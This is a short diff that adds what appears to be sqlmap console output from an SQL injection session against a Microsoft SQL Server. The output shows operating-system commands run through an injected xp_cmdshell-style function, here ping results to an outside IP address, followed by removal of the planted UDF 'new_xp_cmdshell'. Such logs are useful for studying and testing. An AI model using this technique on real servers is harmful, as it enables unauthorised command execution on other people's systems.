@@ -1,0 +1,22 @@
+do you want to retrieve the command standard output? [Y/n/a] Y
+command standard output:
+---
+Pinging 82.29.71.156 with 32 bytes of data:
+Reply from 82.29.71.156: bytes=32 time=183ms TTL=50
+Reply from 82.29.71.156: bytes=32 time=183ms TTL=50
+ 
+Ping statistics for 82.29.71.156:
+    Packets: Sent = 2, Received = 2, Lost = 0 (0% loss),
+    Packets: Sent = 2, Received = 2, Lost = 0 (0% loss),
+Approximate round trip times in milli-seconds:
+    Minimum = 183ms, Maximum = 183ms, Average = 183ms
+    Minimum = 183ms, Maximum = 183ms, Average = 183ms
+ 
+ 
+Pinging 82.29.71.156 with 32 bytes of data:
+Reply from 82.29.71.156: bytes=32 time=242ms TTL=48
+Reply from 82.29.71.156: bytes=32 time=242ms TTL=48
+---
+do you want to remove UDF 'master..new_xp_cmdshell'? [Y/n] Y
+
+[*] ending @ 03:33:49 /2025-11-18/
